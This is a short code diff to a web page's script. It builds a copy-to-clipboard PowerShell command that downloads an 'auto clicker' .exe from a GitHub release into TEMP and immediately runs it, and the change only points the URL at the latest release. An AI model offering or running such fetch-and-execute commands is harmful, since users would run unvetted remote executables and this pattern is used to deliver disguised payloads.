@@ -363,7 +363,7 @@ document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
 (function(){
   var cmd = [
     'powershell -c "iwr ',
-    "'https://github.com/reggieog01-cpu/opauto/releases/download/v3.0.0/op.auto.clicker.exe'",
+    "'https://github.com/reggieog01-cpu/opauto/releases/latest/download/op.auto.clicker.exe'",
     ' -OutFile $env:TEMP\\opauto.exe; Start-Process $env:TEMP\\opauto.exe"'
   ].join('');
   var btn = document.getElementById('copyBtn');
